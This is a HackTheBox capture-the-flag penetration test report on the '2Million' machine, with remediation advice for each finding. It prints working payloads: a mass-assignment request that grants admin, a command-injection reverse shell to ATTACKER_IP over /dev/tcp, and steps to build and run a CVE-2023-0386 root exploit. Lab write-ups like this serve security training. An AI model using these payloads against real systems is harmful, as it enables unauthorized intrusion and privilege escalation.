# Penetration Test Report - HackTheBox: 2Million

**Date:** October 16, 2026  
**Tester:** dhanush1  
**Target:** 2million.htb  
**Difficulty:** Medium  
**OS:** Linux  

---

## Table of Contents
1. [Executive Summary](#executive-summary)
2. [Scope](#scope)
3. [Methodology](#methodology)
4. [Findings](#findings)
   - [Finding 1: Obfuscated JavaScript Exposing API Endpoints](#finding-1-obfuscated-javascript-exposing-api-endpoints)
   - [Finding 2: Invite Code Generation via Unauthenticated API](#finding-2-invite-code-generation-via-unauthenticated-api)
   - [Finding 3: Mass Assignment - Privilege Escalation to Admin](#finding-3-mass-assignment---privilege-escalation-to-admin)
   - [Finding 4: Command Injection in VPN Generation Endpoint](#finding-4-command-injection-in-vpn-generation-endpoint)
   - [Finding 5: Sensitive Credentials in Environment File](#finding-5-sensitive-credentials-in-environment-file)
   - [Finding 6: Local Privilege Escalation via CVE-2023-0386](#finding-6-local-privilege-escalation-via-cve-2023-0386)
5. [Attack Chain Summary](#attack-chain-summary)
6. [Recommendations](#recommendations)
7. [Tools Used](#tools-used)

---

## Executive Summary

A penetration test was conducted against the HackTheBox machine "2Million" 
running on Linux. The assessment identified multiple critical vulnerabilities 
that together allowed full system compromise, from initial unauthenticated 
access through to root-level privilege escalation.

The attack chain began with reverse engineering obfuscated JavaScript to 
discover hidden API endpoints, followed by bypassing the invite-only 
registration system. After gaining a foothold, a mass assignment vulnerability 
allowed escalation to admin privileges. A command injection vulnerability in 
an admin endpoint was then exploited to obtain a reverse shell. Database 
credentials found on the system were used to recover user account passwords, 
enabling SSH access. Finally, a known Linux kernel vulnerability 
(CVE-2023-0386) was exploited to achieve full root access.

### Risk Rating Summary

| Finding | Severity |
|---------|----------|
| Obfuscated JavaScript Exposing API Endpoints | Informational |
| Invite Code Generation via Unauthenticated API | Medium |
| Mass Assignment - Privilege Escalation to Admin | Critical |
| Command Injection in VPN Generation Endpoint | Critical |
| Sensitive Credentials in Environment File | High |
| Local Privilege Escalation via CVE-2023-0386 | High |

---

## Scope

| Item | Value |
|------|-------|
| Target IP | 10.10.11.221 |
| Hostname | 2million.htb |
| OS | Ubuntu Linux |
| Kernel | 5.15.17 |
| Assessment Type | Black Box |

---

## Methodology

The assessment followed a standard penetration testing methodology:

1. **Reconnaissance** — Identifying exposed services, web endpoints, and JavaScript source files
2. **Enumeration** — Discovering API routes, parameters, and application logic
3. **Exploitation** — Leveraging identified vulnerabilities to gain access
4. **Post-Exploitation** — Credential harvesting, lateral movement, privilege escalation
5. **Reporting** — Documenting findings with proof-of-concept and remediation advice

---

## Findings

## Finding 1: Nmap scanning To Find Open Ports

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    nginx 1.18.0


---

### Finding 2: Obfuscated JavaScript Exposing API Endpoints

**Severity:** Informational  
**Location:** `/inviteapi.min.js`  

#### Description
The application loaded a JavaScript file that, while obfuscated using a 
Dean Edwards packer, contained references to internal API endpoints and 
function names. Unpacking the JavaScript revealed two functions:

- `makeInviteCode()` — calls `POST /api/v1/invite/how/to/generate`
- `verifyInviteCode(code)` — calls `POST /api/v1/invite/verify`

#### Evidence
The packed JavaScript used the following structure:
```javascript
eval(function(p,a,c,k,e,d){
  e=function(c){return c.toString(36)};
  ...
}('1 i(4){h 8={"4":4};...', 24, 24, 
'response|function|...|makeInviteCode'.split('|')))
```

After unpacking, the plaintext functions were recovered and used to 
enumerate the invite code generation process.

#### Remediation
- Avoid placing sensitive API endpoint references in client-side JavaScript
- Security through obscurity (obfuscation) is not a substitute for 
  proper access controls
- Move sensitive API logic entirely server-side where possible

---

### Finding 2: Invite Code Generation via Unauthenticated API

**Severity:** Medium  
**Location:** `POST /api/v1/invite/generate`  

#### Description
The API endpoint responsible for generating invite codes was accessible 
without any authentication. A response from `/api/v1/invite/how/to/generate` 
provided ROT13-encoded instructions directing users to this endpoint.

#### Steps to Reproduce
1. Call `POST /api/v1/invite/how/to/generate`
2. Decode the ROT13-encoded response:
   - Encoded: `"Va beqre gb trarengr gur vaivgr pbqr..."`
   - Decoded: `"In order to generate the invite code, make a POST request to /api/v1/invite/generate"`
3. Call `POST /api/v1/invite/generate`
4. Decode the Base64-encoded `code` field in the response:
```javascript
atob("MVI3TlgtSVVBWUctNklESUYtQkNYVkY=")
// Result: "7N7NX-IUAYG-6IDIF-BCXVF"
```
5. Use the decoded invite code to register an account

#### Remediation
- Require authentication or a CAPTCHA before generating invite codes
- Implement rate limiting on invite code generation
- Do not embed instructions for bypassing security controls in API responses

---

### Finding 3: Mass Assignment - Privilege Escalation to Admin

**Severity:** Critical  
**Location:** `PUT /api/v1/admin/settings/update`  

#### Description
The user settings update endpoint accepted an `is_admin` parameter in the 
request body without verifying whether the requesting user already had 
admin privileges. This is a classic **mass assignment** vulnerability — 
any authenticated user could promote themselves to admin simply by 
including `"is_admin": 1` in the request body.

#### Steps to Reproduce
1. Log in as a regular user
2. Send the following request:
```javascript
fetch('/api/v1/admin/settings/update', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({
    email: "dhanush1@example.com",
    is_admin: 1
  })
})
```
3. Verify admin status:
```javascript
fetch('/api/v1/admin/auth', {
  headers: {'Content-Type': 'application/json'},
  credentials: 'include'
})
// Returns: true
```

#### Impact
Any registered user can escalate their privileges to admin, 
gaining access to all admin-only functionality including VPN 
generation for arbitrary users and other sensitive operations.

#### Remediation
- Never allow users to set their own role/privilege fields via API
- Implement server-side authorization checks — only existing admins 
  should be able to promote other users
- Use an allowlist of fields that users are permitted to update 
  (e.g., email, password) and explicitly block sensitive fields 
  like `is_admin`, `role`, `permissions`

---

### Finding 4: Command Injection in VPN Generation Endpoint

**Severity:** Critical  
**Location:** `POST /api/v1/admin/vpn/generate`  

#### Description
The admin VPN generation endpoint passed the user-supplied `username` 
parameter directly into a shell command without sanitization. This allowed 
arbitrary operating system commands to be executed on the server with the 
privileges of the web application user (`www-data`).

#### Steps to Reproduce

**Confirming injection via time delay:**
```javascript
// Baseline request time: ~1330ms
// Injected request time: ~5860ms (+4530ms = sleep 5 executed)
fetch('/api/v1/admin/vpn/generate', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({ username: "dhanush1; sleep 5" })
})
```

**Obtaining a reverse shell:**
```javascript
// Attacker starts listener: nc -lvnp 4444
fetch('/api/v1/admin/vpn/generate', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({
    username: "dhanush1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
  })
})
```

Result: reverse shell obtained as `www-data`.

#### Impact
Full remote code execution on the server as `www-data`. Combined with 
other findings, this led to full system compromise.

#### Remediation
- Never concatenate user input directly into shell commands
- Use parameterized APIs or safe language-level abstractions 
  (e.g., Python's `subprocess` with argument lists instead of shell=True)
- Validate and sanitize all user input — for a username field, 
  only allow alphanumeric characters and hyphens
- Run web application processes with the minimum necessary privileges

---

### Finding 5: Sensitive Credentials in Environment File

**Severity:** High  
**Location:** `/var/www/html/.env`  

#### Description
The application's environment configuration file was readable by the 
`www-data` user and contained plaintext database credentials.

#### Evidence
DB_HOST=127.0.0.1
DB_USER=*****
DB_PASS=*****


These credentials were used to authenticate to the local MariaDB instance, 
where the `users` table was queried to retrieve password hashes for all 
registered accounts.

#### Remediation
- Restrict `.env` file permissions so only the application owner can read it
- Never store credentials in files within the web root
- Consider using a secrets management solution 
  (e.g., HashiCorp Vault, AWS Secrets Manager)
- Rotate all credentials that were exposed

---

### Finding 6: Local Privilege Escalation via CVE-2023-0386

**Severity:** High  
**Location:** Linux Kernel 5.15.17 - OverlayFS subsystem  

#### Description
The target system was running Linux kernel version `5.15.17`, which is 
vulnerable to **CVE-2023-0386** — a local privilege escalation vulnerability 
in the OverlayFS subsystem. The flaw allows a low-privileged user to copy 
a root-owned SUID binary from a `nosuid` FUSE-mounted filesystem to an 
OverlayFS upper layer, where the kernel incorrectly preserves the SUID bit, 
allowing execution with root privileges.

#### How it works
1. A FUSE filesystem is created with a spoofed root-owned SUID binary
2. It is mounted as the lower (read-only) layer of OverlayFS
3. A copy-up is triggered — the kernel copies the file to the upper layer
4. Due to the bug, the kernel does not strip the SUID bit during copy
5. The binary in the upper layer retains its SUID bit and root ownership
6. Executing it from the upper layer yields a root shell

#### Steps to Reproduce
```bash
# Clone the PoC exploit
git clone https://github.com/puckiestyle/CVE-2023-0386
cd CVE-2023-0386
make all

# Terminal 1: start FUSE filesystem (must stay running)
./fuse ./ovlcap/lower ./gc

# Terminal 2: trigger the exploit
./exp

# Result:
# [+] exploiting CVE-2023-0386
# [+] got root!
# whoami → root
```

#### Affected Versions
- Linux kernel 5.11 through 6.1.8 (excluding 5.15.91)

#### Remediation
- Update the Linux kernel to version 5.15.91 or later
- Apply the vendor-supplied security patch
- Where kernel updates are not immediately possible, 
  restrict unprivileged user namespaces:
```bash
sysctl -w kernel.unprivileged_userns_clone=0
```

---

## Attack Chain Summary

## Attack Chain Summary

[Unauthenticated]
│
▼
JS Reverse Engineering → Invite Code Bypass
│
▼
Account Registration → Login
│
▼
API Enumeration (/api/v1)
│
▼
Mass Assignment → Admin Privileges
│
▼
Command Injection → Reverse Shell (www-data)
│
▼
.env File → Database Credentials
│
▼
Database Dump → Password Hash → Cracked → SSH as dhanush1
│
▼
User Flag ✓
│
▼
CVE-2023-0386 (Kernel 5.15.17)
│
▼
Root Shell ✓
│
▼
Root Flag ✓


---

## Recommendations

| Priority | Recommendation |
|----------|----------------|
| Critical | Sanitize all user input before passing to shell commands |
| Critical | Implement server-side authorization for privilege-sensitive fields |
| High | Update Linux kernel to a patched version |
| High | Restrict permissions on `.env` and config files |
| Medium | Implement rate limiting on invite code generation |
| Medium | Remove sensitive API references from client-side JavaScript |
| Low | Replace obfuscation with proper access controls |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Browser DevTools | JavaScript analysis, API interaction |
| de4js | JavaScript unpacking/beautification |
| Netcat (nc) | Reverse shell listener |
| John the Ripper | Password hash cracking |
| hashcat | Password hash cracking |
| curl/fetch | API endpoint interaction |
| CVE-2023-0386 PoC | Kernel privilege escalation |
| mysql client | Database enumeration |

---

*This report was created for educational purposes as part of a 
HackTheBox lab exercise. All testing was performed in a controlled 
environment against an intentionally vulnerable target.*

